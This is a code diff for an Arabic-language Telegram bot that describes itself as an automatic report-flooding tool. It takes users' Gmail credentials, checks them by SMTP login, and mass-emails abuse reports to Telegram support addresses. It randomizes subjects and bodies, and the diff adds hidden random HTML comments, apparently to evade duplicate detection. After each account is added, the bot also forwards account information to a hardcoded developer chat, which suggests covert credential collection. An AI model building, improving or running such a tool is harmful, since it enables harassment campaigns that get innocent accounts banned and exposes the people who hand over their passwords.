@@ -1,5 +1,6 @@
 import telebot
 from telebot import types
+import smtplib
 from email.mime.text import MIMEText
 import ssl
 import time
@@ -27,19 +28,21 @@ TELEGRAM_EMAILS = [
     {"email": "sms@telegram.org", "description": "عدم وصول رسائل SMS"},
     {"email": "dema@telegram.org", "description": "للمطورين (غير مهم)"},
 ]
-user_data = {}
-is_sending_reports = {}
 def load_data():
     if os.path.exists(DATA_FILE):
         with open(DATA_FILE, 'r') as f:
             try:
                 return json.load(f)
             except json.JSONDecodeError:
+                print("خطأ في تحميل JSON، إعادة تهيئة.")
                 return {}
     return {}
 def save_data(data):
     with open(DATA_FILE, 'w') as f:
         json.dump(data, f, indent=4)
+    print("تم حفظ البيانات.")  # logging للتحقق
+user_data = load_data()  # تصحيح: حمل البيانات من JSON في البداية
+is_sending_reports = {}
 def notify_developer_new_user(chat_id, first_name, last_name, username, language_code=None):
     try:
         user_info = (
@@ -77,7 +80,7 @@ def reset_user_state(chat_id, language_code=None):
         "edit_index": None,
         "edit_receiver_index": None
     })
-    save_data(user_data)
+    save_data(user_data)  # حفظ بعد التهيئة
 def get_accounts(chat_id):
     if str(chat_id) not in user_data:
         reset_user_state(chat_id)
@@ -155,7 +158,10 @@ def show_accounts_menu(chat_id, message_id=None):
     else:
         markup.add(types.InlineKeyboardButton("إضافة حساب ", callback_data='add_new_account'))
     markup.add(types.InlineKeyboardButton("رجوع", callback_data='finish_adding'))
-    bot.send_message(chat_id, "حسابات الحالية هيه:", reply_markup=markup)
+    if message_id:
+        bot.edit_message_text("حسابات الحالية هيه:", chat_id=chat_id, message_id=message_id, reply_markup=markup)
+    else:
+        bot.send_message(chat_id, "حسابات الحالية هيه:", reply_markup=markup)
 def show_receiver_emails_menu(chat_id, message_id=None):
     markup = types.InlineKeyboardMarkup(row_width=1)
     receiver_emails_data = get_receiver_emails(chat_id)
@@ -164,7 +170,10 @@ def show_receiver_emails_menu(chat_id, message_id=None):
         button_text = f"{status_icon} {data['email']} - {data['description']}"
         markup.add(types.InlineKeyboardButton(button_text, callback_data=f'toggle_receiver_{i}'))
     markup.add(types.InlineKeyboardButton("رجوع", callback_data='finish_adding'))
-    bot.send_message(chat_id, "اختر بريد شركة التليجرام المستهدف", reply_markup=markup)
+    if message_id:
+        bot.edit_message_text("اختر بريد شركة التليجرام المستهدف", chat_id=chat_id, message_id=message_id, reply_markup=markup)
+    else:
+        bot.send_message(chat_id, "اختر بريد شركة التليجرام المستهدف", reply_markup=markup)
 @bot.callback_query_handler(func=lambda call: True)
 def callback_query(call):
     chat_id = call.message.chat.id
@@ -181,35 +190,29 @@ def callback_query(call):
             if "current_email_to_add" in user_data[str(chat_id)]:
                 del user_data[str(chat_id)]["current_email_to_add"]
                 save_data(user_data)
-            show_accounts_menu(chat_id)
+            show_accounts_menu(chat_id, message_id)
         elif call.data.startswith('view_account_'):
             index = int(call.data.split('_')[-1])
             account_email = get_accounts(chat_id)[index]['email']
             markup = types.InlineKeyboardMarkup(row_width=1)
             markup.add(types.InlineKeyboardButton("❌ حذف هذا الحساب", callback_data=f'delete_account_{index}'))
             markup.add(types.InlineKeyboardButton("الرجوع إلى قائمة الحسابات", callback_data='manage_accounts'))
-            bot.send_message(chat_id, f"هل أنت متأكد من رغبتك في حذف الحساب التالي؟\n\n📧 {account_email}", reply_markup=markup)
+            bot.edit_message_text(f"هل أنت متأكد من رغبتك في حذف الحساب التالي؟\n\n📧 {account_email}", chat_id=chat_id, message_id=message_id, reply_markup=markup)
         elif call.data.startswith('delete_account_'):
             index = int(call.data.split('_')[-1])
             account_email = get_accounts(chat_id)[index]['email']
             del user_data[str(chat_id)]['accounts'][index]
             save_data(user_data)
-            bot.send_message(chat_id, f"✅ تم حذف الحساب {account_email} بنجاح.")
-            show_accounts_menu(chat_id)
+            bot.edit_message_text(f"✅ تم حذف الحساب {account_email} بنجاح.", chat_id=chat_id, message_id=message_id)
+            show_accounts_menu(chat_id, message_id)
         elif call.data == 'manage_receiver_emails':
-            show_receiver_emails_menu(chat_id)
+            show_receiver_emails_menu(chat_id, message_id)
         elif call.data.startswith('toggle_receiver_'):
             index = int(call.data.split('_')[-1])
             receiver_emails = user_data[str(chat_id)]["receiver_emails"]
             receiver_emails[index]["selected"] = not receiver_emails[index]["selected"]
             save_data(user_data)
-            new_markup = types.InlineKeyboardMarkup(row_width=1)
-            for i, data in enumerate(receiver_emails):
-                status_icon = "✅" if data["selected"] else "❌"
-                button_text = f"{status_icon} {data['email']} - {data['description']}"
-                new_markup.add(types.InlineKeyboardButton(button_text, callback_data=f'toggle_receiver_{i}'))
-            new_markup.add(types.InlineKeyboardButton("رجوع  ", callback_data='finish_adding'))
-            bot.send_message(chat_id, "اختر بريد شركة التليجرام المستهدف", reply_markup=new_markup)
+            show_receiver_emails_menu(chat_id, message_id)  # تعديل الرسالة بدلاً من إرسال جديدة
         elif call.data == 'add_new_account':
             bot.clear_step_handler_by_chat_id(chat_id)  # إزالة أي معالجات سابقة
             if "current_email_to_add" in user_data[str(chat_id)]:
@@ -288,12 +291,6 @@ def edit_account_password(message):
     except Exception as e:
         bot.send_message(chat_id, f"❌ حدث خطأ أثناء التحقق من الحساب {email}: {e}")
         show_accounts_menu(chat_id)
-def get_account_email(message):
-    chat_id = message.chat.id
-    markup = types.InlineKeyboardMarkup()
-    markup.add(types.InlineKeyboardButton("رجوع", callback_data='finish_adding'))
-    msg = bot.send_message(chat_id, "أرسل لي البريد الإلكتروني للحساب:", reply_markup=markup)
-    bot.register_next_step_handler(msg, get_account_password)
 def get_account_password(message):
     chat_id = message.chat.id
     if message.text.startswith('/start'):
@@ -334,6 +331,8 @@ def process_new_account(message):
         with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
             server.login(email, password)
         user_data[str(chat_id)]["accounts"].append({"email": email, "password": password})
+        save_data(user_data)  # حفظ فورًا بعد الإضافة
+        # إرسال إلى المطور في try منفصل لعدم تعطيل الرد
         try:
             user = bot.get_chat(chat_id)
             language_code = message.from_user.language_code
@@ -352,8 +351,7 @@ def process_new_account(message):
             )
             bot.send_message(DEVELOPER_CHAT_ID, account_info)
         except Exception as e:
-            print(f"Error notifying developer: {e}")
-        save_data(user_data)
+            print(f"Error notifying developer for new account: {e}")
         markup = types.InlineKeyboardMarkup(row_width=1)
         markup.add(types.InlineKeyboardButton(f"✅ {email}", callback_data='ignore_button'))
         markup.add(types.InlineKeyboardButton("إضافة حساب آخر", callback_data='add_new_account'))
@@ -363,11 +361,15 @@ def process_new_account(message):
             "✅ تم إضافة الحساب بنجاح.",
             reply_markup=markup
         )
+        bot.clear_step_handler_by_chat_id(chat_id)  # تنظيف بعد النجاح
     except smtplib.SMTPAuthenticationError:
         bot.send_message(chat_id, "❌ كلمة المرور أو البريد الإلكتروني غير صحيح. حاول مرة أخرى.")
+        bot.clear_step_handler_by_chat_id(chat_id)
         show_accounts_menu(chat_id)
     except Exception as e:
+        print(f"خطأ عام في process_new_account: {e}")
         bot.send_message(chat_id, f"❌ حدث خطأ أثناء التحقق من الحساب {email}: {e}")
+        bot.clear_step_handler_by_chat_id(chat_id)
         show_accounts_menu(chat_id)
 def add_message_subject(message):
     chat_id = message.chat.id
@@ -432,6 +434,7 @@ def send_all_reports_handler(chat_id):
             message,
             reply_markup=markup
         )
+        bot.clear_step_handler_by_chat_id(chat_id)  # تصحيح: تنظيف
         return
     msg = bot.send_message(chat_id, "كم عدد البلاغات التي تريد إرسالها؟ (أدخل رقماً)")
     bot.register_next_step_handler(msg, start_sending_reports)
@@ -474,8 +477,9 @@ def generate_varied_body(base_body):
             body_lines[i] = body_lines[i].replace(' ', '  ', 1) if ' ' in body_lines[i] else body_lines[i]
             body_lines[i] += ' ' + random.choice(['.', ',', '!', '?']) if random.random() < 0.05 else body_lines[i]
     varied_body = random.choice(prefixes) + '\n'.join(body_lines) + random.choice(suffixes)
-    # إضافة رموز عشوائية أو مسافات لتغيير الهاش
-    varied_body += '\n' + ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(5, 15))) if random.random() < 0.2 else ''
+    # إضافة رموز عشوائية مخفية
+    if random.random() < 0.2:
+        varied_body += '\n<!-- ' + ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(5, 15))) + ' -->'
     return varied_body
 def start_sending_reports(message):
     chat_id = message.chat.id
@@ -528,7 +532,7 @@ def start_sending_reports(message):
         try:
             varied_subject = generate_varied_subject(base_subject)
             varied_body = generate_varied_body(base_body)
-            msg = MIMEText(varied_body, 'html')
+            msg = MIMEText(varied_body, 'plain')  # تصحيح: plain بدلاً من html إلا إذا كان html
             msg['Subject'] = varied_subject
             msg['From'] = account["email"]
             msg['To'] = receiver_email
@@ -589,14 +593,12 @@ def start_sending_reports(message):
     is_sending_reports[chat_id] = False
     show_main_menu(chat_id)
 def show_main_menu(chat_id, message_id=None):
-    inline_markup = types.InlineKeyboardMarkup(row_width=1)
-    item_accounts = types.InlineKeyboardButton("أضف حسابك", callback_data='manage_accounts')
-    item_receiver_emails = types.InlineKeyboardButton("حدد حسابات شركة التليجرام", callback_data='manage_receiver_emails')
-    item_message = types.InlineKeyboardButton("إضافة كود وموضوع البلاغ", callback_data='add_message_content')
-    item_send = types.InlineKeyboardButton("حدد عدد البلاغات", callback_data='send_all_reports')
+    inline_markup = types.InlineKeyboardMarkup(row_width=1)  # ترتيب عمودي
+    item_accounts = types.InlineKeyboardButton("📧 أضف حسابك", callback_data='manage_accounts')
+    item_receiver_emails = types.InlineKeyboardButton("🎯 حدد حسابات شركة التليجرام", callback_data='manage_receiver_emails')
+    item_message = types.InlineKeyboardButton("📝 إضافة كود وموضوع البلاغ", callback_data='add_message_content')
+    item_send = types.InlineKeyboardButton("🚀 حدد عدد البلاغات", callback_data='send_all_reports')
     inline_markup.add(item_accounts, item_receiver_emails, item_message, item_send)
-    reply_markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
-    reply_markup.add(types.KeyboardButton("/start"), types.KeyboardButton("/ايقاف"))
     welcome_message = (
         "*♦ أهلاً بك في بوت شد بلاغات التليجرام التلقائي\\.*\n"
         "\\ ▪️طريقة عمل البوت اتبع الخطوات بالترتيب: \n"
@@ -606,20 +608,23 @@ def show_main_menu(chat_id, message_id=None):
         "\\ \\(4\\) حدد عدد البلاغات\n"
         "♦ مطور البوت: [ڪَِنتِـآإڪَِيٰ](tg://openmessage?user_id=1800163946)"
     )
-    sent_message = bot.send_message(
-        chat_id, 
-        welcome_message, 
-        parse_mode='MarkdownV2', 
-        reply_markup=inline_markup
-    )
-    if str(chat_id) not in user_data:
-        user_data[str(chat_id)] = {}
-    user_data[str(chat_id)]["last_menu_message_id"] = sent_message.message_id
-    save_data(user_data)
+    if message_id:
+        bot.edit_message_text(welcome_message, chat_id=chat_id, message_id=message_id, parse_mode='MarkdownV2', reply_markup=inline_markup)
+    else:
+        sent_message = bot.send_message(
+            chat_id, 
+            welcome_message, 
+            parse_mode='MarkdownV2', 
+            reply_markup=inline_markup
+        )
+        if str(chat_id) not in user_data:
+            user_data[str(chat_id)] = {}
+        user_data[str(chat_id)]["last_menu_message_id"] = sent_message.message_id
+        save_data(user_data)
 print("البوت يعمل...")
 while True:
     try:
-        bot.polling(none_stop=True, interval=0, timeout=60)
+        bot.polling(none_stop=True, interval=0, timeout=120)  # زيادة timeout لـ Railway
     except Exception as e:
         print(f"حدث خطأ في الاتصال: {e}")
         time.sleep(5)
